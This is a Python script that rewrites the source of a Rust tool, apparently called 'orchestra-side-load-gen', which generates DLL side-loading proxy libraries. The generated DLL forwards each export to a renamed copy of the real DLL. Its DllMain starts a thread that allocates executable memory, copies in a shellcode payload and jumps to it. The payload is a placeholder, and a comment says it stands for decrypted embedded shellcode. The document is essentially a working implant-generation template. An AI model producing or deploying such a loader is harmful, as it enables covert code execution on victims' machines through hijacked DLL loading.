import re

with open("orchestra-side-load-gen/src/main.rs", "r") as f:
    c = f.read()

# Replace MSVC pragma with proper lld link exports map strategy 
c = c.replace("", "")
# Instead of MSVC #pragma, write an export forwarder logic or keep standard Rust [export_name] wrappers.

# We will just write a Rust exported function that jumps directly. 
# We need to completely rewrite the code generator to generate safe stub forwards.
replacement = """
    let mut stubs = String::new();
    for export in exports.clone() {
        stubs.push_str(&format!(r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    // forward stub
    let lib = winapi::um::libloaderapi::LoadLibraryA(b"real_{}\\0".as_ptr() as _);
    if !lib.is_null() {{
        let proc = winapi::um::libloaderapi::GetProcAddress(lib, b"{}\\0".as_ptr() as _);
        if !proc.is_null() {{
            let f: extern "system" fn() = std::mem::transmute(proc);
            f();
        }}
    }}
}}
"#, export, target_dll, export));
    }

    let code = format!("
// auto-generated DLL side-loading forwarder
use winapi::um::winnt::DLL_PROCESS_ATTACH;
use winapi::um::libloaderapi::DisableThreadLibraryCalls;
use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};

{}

#[no_mangle]
#[allow(non_snake_case)]
pub extern \\"system\\" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
    if reason == DLL_PROCESS_ATTACH {{
        unsafe {{ DisableThreadLibraryCalls(hinst); }}
        // spawn agent early
        std::thread::spawn(|| {{
            // the payload...
            // Decrypt embedded shellcode
            let mut payload = vec![0x90, 0x90, 0xC3]; // NOOP, NOOP, RET placeholder
            let mem = unsafe {{
                winapi::um::memoryapi::VirtualAlloc(
                    std::ptr::null_mut(),
                    payload.len(),
                    winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
                    winapi::um::winnt::PAGE_EXECUTE_READWRITE,
                )
            }};
            if !mem.is_null() {{
                unsafe {{
                    std::ptr::copy_nonoverlapping(payload.as_ptr(), mem as _, payload.len());
                    let run: extern \"C\" fn() = std::mem::transmute(mem);
                    run();
                }}
            }}
        }});
    }}
    1
}}
", stubs);
"""

# Reconstruct generator logic
with open("orchestra-side-load-gen/src/main.rs", "w") as f:
    f.write("""use std::env;
use std::fs;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 3 {
        println!("Usage: orchestra-side-load-gen <target_dll_name> <export1,export2,...>");
        return;
    }
    let target_dll = &args[1];
    let exports = args[2].split(',').collect::<Vec<&str>>();
""" + replacement + """
    fs::write("side_loaded.rs", code).unwrap();
    println!("Generated side_loaded.rs to forward exports for {}", target_dll);
}
""")
